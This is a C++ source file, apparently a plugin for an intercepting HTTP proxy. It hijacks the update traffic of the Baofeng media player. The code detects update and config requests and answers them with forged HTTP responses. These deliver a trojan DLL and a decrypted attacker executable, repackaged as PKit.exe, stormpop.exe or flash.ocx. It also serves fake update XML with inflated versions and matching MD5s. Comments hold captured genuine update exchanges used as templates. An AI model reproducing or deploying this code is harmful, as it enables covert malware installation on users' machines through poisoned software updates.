#include "baofeng.h"
#include "PluginServer.h"
#include "../attacker.h"
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"
#include "../FileOper.h"


int gBaofengFlag = 3;

int BaofengPllugin::isBaofengUpdate(const char* url, const char* host) {
	if (strstr(host, "update.baofeng.com")) {
		if (strstr(url, "PKit.exe.zip"))
		{
			gBaofengFlag = 5;
			return TRUE;
		}
		else if (strstr(url, "stormpop.exe.zip"))
		{
			gBaofengFlag = 6;
			return TRUE;
		}
		else if (strstr(url, ".exe"))
		{
			gBaofengFlag = 1;
			return TRUE;
		}
		else if (strstr(url, ".dll"))
		{
			gBaofengFlag = 2;
			return TRUE;
		}
	}
	else if (strstr(host, "baofeng.net"))
	{
		if (strstr(url, "/loadConfig/common.xml?"))
		{
			gBaofengFlag = 3;
			return TRUE;
		}
		else if (strstr(url, "flash.zip"))
		{
			gBaofengFlag = 4;
			return TRUE;
		}
	}
	else if (strstr(host, "config5.update.baofeng.com") && strstr(url, "/GetUpgradeXml.php?"))
	{
		gBaofengFlag = 7;
		return TRUE;
	}

	return FALSE;
}



int BaofengPllugin::replyBaofengPlugin(char* dstbuf, int len, int dstbuflimit, LPHTTPPROXYPARAM lphttp) {
	char* szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Connection: keep-alive\r\n"
		"Content-Type: application/octet-stream\r\n"
		"Content-Length: %u\r\n\r\n";

	if (gBaofengFlag == 1)
	{
		string filename = Public::getUserUrl(lphttp->username, WEIXIN_PC_UPDATE_EXE_FILENAME);
		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
		return 0;
	}
	else if (gBaofengFlag == 2)
	{
		string filename = Public::getUserUrl(lphttp->username, DLLTROJAN_FILE_NAME);
		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
		return 0;
	}
	else if (gBaofengFlag == 5)
	{
		string exesrcfn = Public::getUserPluginPath(lphttp->username) + WEIXIN_PC_UPDATE_EXE_FILENAME;
		string newexefn = exesrcfn + "_new.exe";
		int ret = FileOper::fileDecryptWriter(exesrcfn, newexefn);

		string zipfn = Public::getUserPluginPath(lphttp->username) + "PKit.exe.zip";

		string inzipfn = "PKit.exe";

		ret = Public::zipFile(inzipfn.c_str(), newexefn, zipfn);

		string filename = Public::getUserUrl(lphttp->username, "PKit.exe.zip");
		ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
		return 0;

	}
	else if (gBaofengFlag == 6)
	{
		string exesrcfn = Public::getUserPluginPath(lphttp->username) + WEIXIN_PC_UPDATE_EXE_FILENAME;
		string newexefn = exesrcfn + "_new.exe";
		int ret = FileOper::fileDecryptWriter(exesrcfn, newexefn);

		string zipfn = Public::getUserPluginPath(lphttp->username) + "stormpop.exe.zip";

		string inzipfn = "stormpop.exe";

		ret = Public::zipFile(inzipfn.c_str(), newexefn, zipfn);

		string filename = Public::getUserUrl(lphttp->username, "stormpop.exe.zip");
		ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
		return 0;
	}
	else if (gBaofengFlag == 4)
	{
		string exesrcfn = Public::getUserPluginPath(lphttp->username) + WEIXIN_PC_UPDATE_EXE_FILENAME;
		string newexefn = exesrcfn + "_new.exe";
		int ret = FileOper::fileDecryptWriter(exesrcfn, newexefn);

		string zipfn = Public::getUserPluginPath(lphttp->username) + "flash.exe.zip";

		string inzipfn = "flash.exe";

		ret = Public::zipFile(inzipfn.c_str(), newexefn, zipfn);

		string filename = Public::getUserUrl(lphttp->username, "flash.exe.zip");
		ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
		return 0;
	}
	else if (gBaofengFlag == 3)
	{
		int ret = FALSE;

		char* lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

		string ip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;

		string exesrcfn = Public::getUserPluginPath(lphttp->username) + WEIXIN_PC_UPDATE_EXE_FILENAME;
		string newexefn = exesrcfn + "_new.exe";
		ret = FileOper::fileDecryptWriter(exesrcfn, newexefn);
		if (ret <= 0)
		{
			return FALSE;
		}

		string srczip = "flash.zip";

		string zipfn = Public::getUserPluginPath(lphttp->username) + srczip;

		string inzipfn = "flash.ocx";

		ret = Public::zipFile(inzipfn.c_str(), newexefn, zipfn);
		if (ret == 0)
		{
			return FALSE;
		}

		char szmd5[64] = { 0 };
		unsigned char hexmd5[64] = { 0 };
		int filesize = CryptoUtils::getUpdateFileMd5(zipfn, szmd5, hexmd5, 1);
		if (filesize <= 0)
		{
			return FALSE;
		}

		char* retformat =
			"<?xml version=\"1.0\" encoding=\"utf-8\" ?>\r\n"
			"<Config>\r\n\r\n"
			"<bfflash>\r\n"
			"<file ver=\"normal\" url=\"http://%s/%s\" savename=\"flash.zip\" savedir=\"Core\\codecs\" md5=\"%s\"/>\r\n"
			"</bfflash>\r\n\r\n"
			"</Config>";

		char result[4096];
		int retlen = sprintf(result, retformat, ip.c_str(), srczip.c_str(), szmd5);

		int responseLen = sprintf_s(dstbuf, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, retlen, result);

		return responseLen;
	}
	else if (gBaofengFlag == 7)
	{
		int ret = FALSE;

		char* lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

		string exesrcfn = Public::getUserPluginPath(lphttp->username) + WEIXIN_PC_UPDATE_EXE_FILENAME;
		string newexefn = exesrcfn + "_baofeng.exe";
		ret = FileOper::fileDecryptWriter(exesrcfn, newexefn);

		char exemd5[64] = { 0 };
		unsigned char hexmd5[64] = { 0 };
		int exefs = CryptoUtils::getUpdateFileMd5(newexefn, exemd5, hexmd5, 0);

		string zipfn = Public::getUserPluginPath(lphttp->username) + "stormpop.exe.zip";
		string inzipfn = "stormpop.exe";
		ret = Public::zipFile(inzipfn.c_str(), newexefn, zipfn);
		char zipmd5[64] = { 0 };
		int zipfs = CryptoUtils::getUpdateFileMd5(zipfn, zipmd5, hexmd5, 0);

		string zipfn2 = Public::getUserPluginPath(lphttp->username) + "PKit.exe.zip";
		inzipfn = "PKit.exe";
		ret = Public::zipFile(inzipfn.c_str(), newexefn, zipfn2);
		char zip2md5[64] = { 0 };
		int zip2fs = CryptoUtils::getUpdateFileMd5(zipfn2, zip2md5, hexmd5, 0);

		string ip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;

		char* retformat =
			"<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n"
			"<update>\r\n"
			"<Version>\r\n"
			"<MainVersion Version=\"9.99.1215.1121\" />\r\n"
			"<PlayerVersion Version=\"9.99.1118.11\" />\r\n"
			"<BoxVersion Version=\"9.99.1118.11\" />\r\n"
			"<P2PVersion Version=\"9.99.1118.11\" />\r\n"
			"<ADVersion Version=\"9.99.1118.11\" />\r\n"
			"</Version>\r\n"
			"<Settings>\r\n"
			"<!-- 2011/08/09 去除参数 ShowNotice=\"\" -->\r\n"
			"<!-- 2011/08/09 增加参数 ShowCount=\"3\" -->\r\n"
			"<ShowNotice ShowCount=\"3\" Mode=\"default\" NoticeURL=\"http://config.baofeng.net/loadConfig/update/ver5.07.1215/index_bf5.1215.html\">"
			"<![CDATA[]]></ShowNotice>\r\n"
			"<AutoUpdateInterval Interval=\"1\" />\r\n"
			"<!-- 2011/08/09 增加节点 <p2psettings open=\"1\" timeout=\"1800\" lowspeed=\"5\" /> -->\r\n"
			"<P2psettings Open=\"1\" Timeout=\"1200\" Lowspeed=\"5\" />\r\n"
			"<!-- 2011/08/09 去除节点-->\r\n"
			"<!-- <ForceAlertInterval Interval=\"15\" />  -->\r\n"
			"</Settings>\r\n"
			"<SubSystem Name=\"Component\">"
			"<Package URL=\"http://%s/%s\" ZipMD5=\"%s\"><File Name=\"stormpop.exe\" MD5=\"%s\" Ver="" filesize=\"%u\" Path=\"%%install%%\"/></Package>"
			"<Package URL=\"http://%s/%s\" ZipMD5=\"%s\"><File Name=\"PKit.exe\" MD5=\"%s\" Ver="" filesize=\"%u\" Path=\"%%install%%\"/></Package>"
			"</SubSystem>\r\n"
			"</update>";

		char result[4096];
		int retlen = sprintf(result, retformat,
			ip.c_str(), "stormpop.exe.zip", zipmd5, exemd5, exefs,
			ip.c_str(), "PKit.exe.zip", zip2md5, exemd5, exefs);

		int responseLen = sprintf_s(dstbuf, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, retlen, result);

		return responseLen;
	}

	return 0;
}


/*
GET /GetUpgradeXml.php?&Bid=2&MainVer=5.77.0328.1111&MEEVer=1.0.00.1231&PlayerVer=5.77.0328.0011&BoxVer=5.77.0328.0011&P2PVer=5.77.0328.0011&ADVer=5.77.0328.0011&OSVer=10.0&Mode=auto HTTP/1.1
Connection: Keep-Alive
Accept-Encoding: gzip,default
User-Agent: Mozilla/4.0
Host: config5.update.baofeng.com

HTTP/1.1 200 OK
Content-Type: application/octet-stream
Accept-Ranges: none
Content-Length: 1667
Connection: close

<?xml version="1.0" encoding="utf-8"?>
<update>
<Version>
<MainVersion Version="5.99.1215.1121" />
<PlayerVersion Version="5.99.1118.11" />
<BoxVersion Version="5.99.1118.11" />
<P2PVersion Version="5.99.1118.11" />
<ADVersion Version="5.99.1118.11" />
</Version>
<Settings>
<!-- 2011/08/09 去除参数 ShowNotice="" -->
<!-- 2011/08/09 增加参数 ShowCount="3" -->
<ShowNotice ShowCount="3" Mode="default" NoticeURL="http://config.baofeng.net/loadConfig/update/ver5.07.1215/index_bf5.1215.html"><![CDATA[新版本特性：
1.启动速度极致提升，畅快启动享受影视；
2.播放能力再提升，播放无所不能；
3.高清播放功能改进，高清播放更流畅；
4.全新改进皮肤功能，炫丽皮肤更赏心悦目；
5.新增和改进大量细节功能，使用体验更好。]]></ShowNotice>

<AutoUpdateInterval Interval="1" />

<!-- 2011/08/09 增加节点 <p2psettings open="1" timeout="1800" lowspeed="5" /> -->
<P2psettings Open="1" Timeout="1200" Lowspeed="5" />

<!-- 2011/08/09 去除节点 -->
<!-- <ForceAlertInterval Interval="15" />  -->
</Settings>
<SubSystem Name="Component">
<Package URL="http://config5.update.baofeng.com/storm5/stormpop.exe.zip"
ZipMD5="3B16EB2AD089291A076399F334D6EC75"><File Name="stormpop.exe"
MD5="01EEC38D68E421FD583BF74A0E99FBEC" Ver="" filesize="270336" Path="%install%"/>
</Package><Package URL="http://config5.update.baofeng.com/storm5/PKit.exe.zip"
ZipMD5="F1D4987847E799E6FC210881FDA7CA79"><File Name="PKit.exe" MD5="01EEC38D68E421FD583BF74A0E99FBEC"
Ver="" filesize="270336" Path="%install%"/></Package></SubSystem>

</update>
*/


/*
GET /storm5/stormpop.exe.zip HTTP/1.1
Host: config5.update.baofeng.com
Accept:*//*
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0C; .NET4.0E)
Cache-Control: no-cache
Connection: Keep-Alive

HTTP/1.1 200 OK
Content-Type: application/octet-stream
Accept-Ranges: none
Content-Length: 82891
Connection: close

PK........{6.ML....C... ......stormpop.exe

GET /storm5/PKit.exe.zip HTTP/1.1
Host: config5.update.baofeng.com
Accept:*//*
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0C; .NET4.0E)
Cache-Control: no-cache
Connection: Keep-Alive

HTTP/1.1 200 OK
Content-Type: application/octet-stream
Accept-Ranges: none
Content-Length: 82883
Connection: close

PK........{6.ML....C... ......PKit.exe
*/



/*
GET /loadConfig/common.xml?ver=5.77.0328.1111 HTTP/1.1
Host: config.baofeng.net
Accept:*//*
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko
Cache-Control: no-cache
Connection: Keep-Alive
Cookie: LASTDAYS=0; VISIT=1; BOXID=%7B181852BB-A07E-77BC-8B9B-8393689FF54A%7D; DATE=1558149220; Hm_lvt_4de0fd961db127310f7569b53da1ea28=1558149584,1558150417,1558150792

HTTP/1.1 200 OK
Server: nginx/1.12.0
Date: Sat, 18 May 2019 04:47:23 GMT
Content-Type: text/xml
Content-Length: 10304
Last-Modified: Thu, 14 Feb 2019 10:00:26 GMT
Connection: keep-alive
ETag: "5c653c3a-2840"
Expires: Sat, 18 May 2019 04:52:23 GMT
Cache-Control: max-age=300
Accept-Ranges: bytes

<?xml version="1.0" encoding="utf-8" ?>

<Config>

<bfflash>
<file ver="win8" url="http://moviebox.baofeng.net/img/flash/flash_win8/flash.zip" savename="flash.zip" savedir="Core\codecs" md5="f9cbf9147ecdb2a6cd5e05e64021c7b0" />
<file ver="normal" url="http://moviebox.baofeng.net/img/flash/flash_norm/flash.zip" savename="flash.zip" savedir="Core\codecs" md5="4d081f107ab26311f3b13e6f6d9db6c0" />
</bfflash>

<medialibrary>
	<delay min="2" max="5"></delay>
  </medialibrary>
	<LoadingDown>
	   <file format="480" url="http://loading.baofeng5.baofeng.net/swf/480P.swf" md5="3f4f34ca7d4098554fffee0bc7c9cb71"/>
	   <file format="720" url="http://loading.baofeng5.baofeng.net/swf/720P.swf" md5="3f4f34ca7d4098554fffee0bc7c9cb71"/>
	</LoadingDown>
.
.
.<OnlineDownVer>
..<file ver="5.11.0328.1111,5.11.0411.1111" url="" savename="loadingMaterials.zip" savedir="Profiles\vod\loading" md5="" />
.</OnlineDownVer>
.<OnlineDownNover>
..<file url="http://static.houyi.baofeng.net/Loading/loading190214/loadingMaterials.zip" savename="loadingMaterials.zip" savedir="Profiles\vod\loading" md5="02046aabaa6c9010c1e7ee039eb81ab6" />
.</OnlineDownNover>
.
.<PauseDownVer>
..<file ver="5.09.0118.1111" url="http://config.baofeng.net/loadConfig/MidADMaterials/file2/pauseMaterials.zip" savename="pauseMaterials.zip" savedir="Profiles\vod\default_midAD" md5="242883f6406c8fcf81cfc5b7ab15e8f0" />
..<file ver="5.09.0208.1111" url="http://config.baofeng.net/loadConfig/MidADMaterials/file2/pauseMaterials.zip" savename="pauseMaterials.zip" savedir="Profiles\vod\default_midAD" md5="242883f6406c8fcf81cfc5b7ab15e8f0" />
..<file ver="5.09.0215.1111" url="http://config.baofeng.net/loadConfig/MidADMaterials/file2/pauseMaterials.zip" savename="pauseMaterials.zip" savedir="Profiles\vod\default_midAD" md5="242883f6406c8fcf81cfc5b7ab15e8f0" />
..<file ver="5.09.0222.1111" url="http://config.baofeng.net/loadConfig/MidADMaterials/file2/pauseMaterials.zip" savename="pauseMaterials.zip" savedir="Profiles\vod\default_midAD" md5="242883f6406c8fcf81cfc5b7ab15e8f0" />
..<file ver="5.09.0206.2221" url="http://config.baofeng.net/loadConfig/MidADMaterials/file2/pauseMaterials.zip" savename="pauseMaterials.zip" savedir="Profiles\vod\default_midAD" md5="242883f6406c8fcf81cfc5b7ab15e8f0" />
..<file ver="5.09.0225.1121" url="http://config.baofeng.net/loadConfig/MidADMaterials/file2/pauseMaterials.zip" savename="pauseMaterials.zip" savedir="Profiles\vod\default_midAD" md5="242883f6406c8fcf81cfc5b7ab15e8f0" />
..<file ver="5.09.0119.1112" url="http://config.baofeng.net/loadConfig/MidADMaterials/file2/pauseMaterials.zip" savename="pauseMaterials.zip" savedir="Profiles\vod\default_midAD" md5="242883f6406c8fcf81cfc5b7ab15e8f0" />
..<file ver="5.09.0213.1432" url="http://config.baofeng.net/loadConfig/MidADMaterials/file2/pauseMaterials.zip" savename="pauseMaterials.zip" savedir="Profiles\vod\default_midAD" md5="242883f6406c8fcf81cfc5b7ab15e8f0" />
..<file ver="5.09.0206.2121" url="http://config.baofeng.net/loadConfig/MidADMaterials/file2/pauseMaterials.zip" savename="pauseMaterials.zip" savedir="Profiles\vod\default_midAD" md5="242883f6406c8fcf81cfc5b7ab15e8f0" />
.</PauseDownVer>
.<PauseDownNover>
..<file url="http://config.baofeng.net/loadConfig/MidADMaterials/file1/pauseMaterials.zip" savename="pauseMaterials.zip" savedir="Profiles\vod\default_midAD" md5="980c1b2ca78f7430bf28af4a9ff61f02" />
.</PauseDownNover>

.<OnlineDevice>
..<file url="http://config.baofeng.net/loadConfig/ZMDevice/common.zip" md5="2a32c225fa4d925eaf1038a969d7d516"/>
.</OnlineDevice>
<UGCADTIME>35</UGCADTIME>
<TREEERRORLOG>1</TREEERRORLOG>
<UGCPlay>23,24,26,66,29,68,69,27,28,30,32,33,34,35,36,38,39</UGCPlay>
<CORNERADVER>5.14.0627.1111</CORNERADVER>

<ENABLEVAHOOK>0</ENABLEVAHOOK>
<UGCP2PADCheck>1</UGCP2PADCheck>
<UGCP2PADStart>1</UGCP2PADStart>
<UGCP2PADPlay>15</UGCP2PADPlay>
<P2PKeySeek>1</P2PKeySeek>
<jisu>1</jisu>
<wpjisu>1</wpjisu>

<caption>
	 <switch>1</switch>
	 <url>http://caption.baofeng.net/caption/ </url>
	</caption>

 <ADDspParserNoVer>
<file url="http://parser.houyi.baofeng.net/parser.swf" savename="parser.swf" savedir="Profiles\vod\dsp" md5="43b35ba012ebb032b50c0ea28f81eb25" />
</ADDspParserNoVer>

<DPLConfig FirstTime="2" Intervaltime="2" Report="35" Count="30"></DPLConfig>
<DPLPConfig FirstTime="6" Intervaltime="3"  Count="30" />
<LETVConfig InitIEHostProbability="0"/>

<LoginConfig GetWay="1" ResetAutoLogin="0"></LoginConfig>
<AllowDVP>1</AllowDVP>
<AllowDPP>1</AllowDPP>
<DISENABLEIRS>1</DISENABLEIRS>
<corner>
	   <switch>1</switch>
	   <cnr_url>http://corner.houyi.baofeng.net/Consultation/index.php</cnr_url>
	   <news>0</news>
</corner>
<PreDownConfig switch="1" FirstTime="10"/>
<share> <s1>1</s1><s2>1</s2><s3>1</s3><s4>1</s4><s5>1</s5><s6>1</s6> </share>
<local_hints>1</local_hints>
<online_hints>1</online_hints>
<BigshowDownNover>
	  <file url="http://onlinetips.baofeng5.baofeng.net/bigshow/bigshow.zip" savename="bigshow.zip" savedir="SkinMat" md5="f3688ef29ca00bdc6a3ab7e7d7cb641f" />
</BigshowDownNover>
<bigshow>1</bigshow>
<Tips_Intercept>1</Tips_Intercept>
<BFCupid>
<CupidMainSwitch>1</CupidMainSwitch>
<CupidAllowIE>1</CupidAllowIE>
</BFCupid>
<DRP>
	<groupid  CD="15">1</groupid>
</DRP>
<DR>
	<kwd>uL5S+o5omZ5+Sp5tKp5jVGZvNEbhVmU2</kwd>
	<wt>300</wt>
	<lct>=QZ4VmLjVGZvNEbhVmUvM3Yl9SbvNmLlJXYoVGbwJXZw5yd3d3LvoDc0RHa=</lct>
</DR>
<IRSSPLITER>1</IRSSPLITER>
<IRSSPLITERTIMER>10</IRSSPLITERTIMER>
<LETOOERATE>30</LETOOERATE>
<LRTOOERATE>40</LRTOOERATE>
<ORTOOERATE>40</ORTOOERATE>
<IRS2SWITCH>0</IRS2SWITCH>
<IRSMRMC>1</IRSMRMC>

<BreezeLoading>1</BreezeLoading>
	  <BreezeLoadingDown>
	  <file url="http://loading.baofeng5.baofeng.net/swf/breeze.swf" md5="244cf27e37f3b5173ff3b9f62881ac30" />
	  </BreezeLoadingDown>
<Yingpu>
	   <switch>1</switch>
	   <delay>10</delay>
</Yingpu>
<ZMInstallDownload>
<file url="http://dl.baofeng.com/baofeng5/zhuanma-5.71.0717.1111.exe" version="1.3" IsForceUpdate="0" />
</ZMInstallDownload>
<DLNASwitch>1</DLNASwitch>
<DLNAHelp1>http://dlna.baofeng.com/pchelp/howtouse.html</DLNAHelp1>
<DLNAHelp2>http://dlna.baofeng.com/pchelp/problems.html#reason</DLNAHelp2>
<Danmu>
  <rolling_time>9</rolling_time>
  <request>60</request>
  <switch>0</switch>
  <live>1</live>
  <live_request>1</live_request>
</Danmu>
 <zmg>
	   <switch>1</switch>
	   <cnr_url>http://corner.houyi.baofeng.net/Consultation/index.php</cnr_url>
	   <sysoff>5</sysoff>
</zmg>
<vplus>
	   <vplusdownload>http://moviebox.baofeng.net/vadd/</vplusdownload>
</vplus>
<Watermark>
.<file url="http://moviebox.baofeng.net/img/watermark/logo.zip" savename="logo.zip" savedir="Profiles\vod\watermark" md5="f7a96e1e39b61e422a2a8920c5220b54" />
</Watermark>
<iphonetips>0</iphonetips>
<tgswitch>1</tgswitch>
<tg>
  <file url="http://web.houyi.baofeng.net/Consultation/web.php?id=pc_cbtn"/>
</tg>

<fxswitch1>1</fxswitch1>
<fxwelcome>0</fxwelcome>
<fxhints>
	<ShowType>1</ShowType>
	<AdUrl>http://web.houyi.baofeng.net/Consultation/web.php?id=fx_hints</AdUrl>
</fxhints>
<fxControl>
<fixtureBtn>1</fixtureBtn>
<realmName>http://show.baofeng.com/</realmName>
<field>channel=baofeng_</field>
</fxControl>


<HKLDFlash>
.<switch>1</switch>
</HKLDFlash>

 <Live>
 <file url="http://moviebox.baofeng.net/img/watermark/livePic.png" savename="livePic.png" savedir="Profiles\vod\Live" md5="6a66a35e1c158c53162fec00b269459f" />
</Live>

<panoswf>
<file url="http://wl.houyi.baofeng.net/media/img/houyi/web/material20/10352/3D.swf" savename="3D.swf" savedir="Profiles\vod\dsp" md5="7cdc48fd2e23f2716bc5a824fa4e5f34"/>
</panoswf>

<H265HDSwitch>1</H265HDSwitch>
<perform_report>
  <wait_time></wait_time>
  <report_set></report_set>
</perform_report>

<BoxRenderer>
.<switch>1</switch>
.<refresh_render>5</refresh_render>
	<refresh_cefhost>3</refresh_cefhost>
   .<gpu_switch>1</gpu_switch>
.<ie_switch>0</ie_switch>
.<tk_trytostorm_timeout_cnt>1</tk_trytostorm_timeout_cnt>
	<tk_trytostorm_time>10</tk_trytostorm_time>
	<tk_play_cnt>4</tk_play_cnt>
	<tk_playsuc_rate>60</tk_playsuc_rate>
	<tk_cpu>Intel(R) Atom(TM),Intel(R) Celeron(R) CPU,Intel(R) Xeon,Celeron(R) Dual-Core CPU,Intel(R) Celeron(R),Intel(R) Core(TM)2,AMD A4</tk_cpu>
	<tk_comb_condition>1</tk_comb_condition>
	<cache>0</cache>
.<reset_stamp>1499875200</reset_stamp>
</BoxRenderer>

<WindowShadow>
.<switch>1</switch>
</WindowShadow>

<pano_identify>
	<pano_on>3</pano_on>
	<upload_pic>0</upload_pic>
	<pano_parse2>1</pano_parse2>
</pano_identify>

<dailynews>
   <wid>37,44</wid>
</dailynews>

<express>1</express>

<hbrec>
 <switch>4</switch>
 <typeid>1,2</typeid>
 <count>11</count>
 <breeze>1</breeze>
 <poster>1</poster>
 <countdown>210</countdown>
</hbrec>
<pauselog>1</pauselog>
<vipaccelerate>
 <switch>1</switch>
</vipaccelerate>
<MovielibrayUnZipPic>0</MovielibrayUnZipPic>
<shopping>
<switch>1</switch>
<count>60</count>
</shopping>

<BoxRenderer_official>
 <flash_mute>1</flash_mute>
 <refresh_render>5</refresh_render>
 <refresh_cefhost>3</refresh_cefhost>
 <gpu_switch>1</gpu_switch>
 <ie_switch>0</ie_switch>
 <tk_trytostorm_timeout_cnt>1</tk_trytostorm_timeout_cnt>
 <tk_trytostorm_time>20</tk_trytostorm_time>
 <tk_play_cnt>4</tk_play_cnt>
 <tk_playsuc_rate>60</tk_playsuc_rate>
 <tk_cpu>Intel(R) Atom(TM),Intel(R) Celeron(R) CPU,Intel(R) Xeon,Celeron(R) Dual-Core CPU,Intel(R) Celeron(R),Intel(R) Core(TM)2,AMD A4</tk_cpu>
 <tk_proxyatuodetect>1</tk_proxyatuodetect>
 <tk_comb_condition>0</tk_comb_condition>
 <cache>1</cache>
 <reset_stamp></reset_stamp>
</BoxRenderer_official>

<desktopTips>
<intervals>1440</intervals>
<restoreIcon>0</restoreIcon>
</desktopTips>

<AD_IE_SWITCH>
<ie_bfswitch>1</ie_bfswitch>
<ie_adswitch>1</ie_adswitch>
</AD_IE_SWITCH>

<adyl>
 <resolution>1</resolution>
 <fullscreen>0</fullscreen>
 <fullscreen2>14</fullscreen2>
</adyl>

<VideoBrowser>
<mode>1</mode>
</VideoBrowser>

<c-ploy>
 <id>1004,115,262</id>
 <not>1</not>
 <d>2</d>
</c-ploy>

</Config>



*/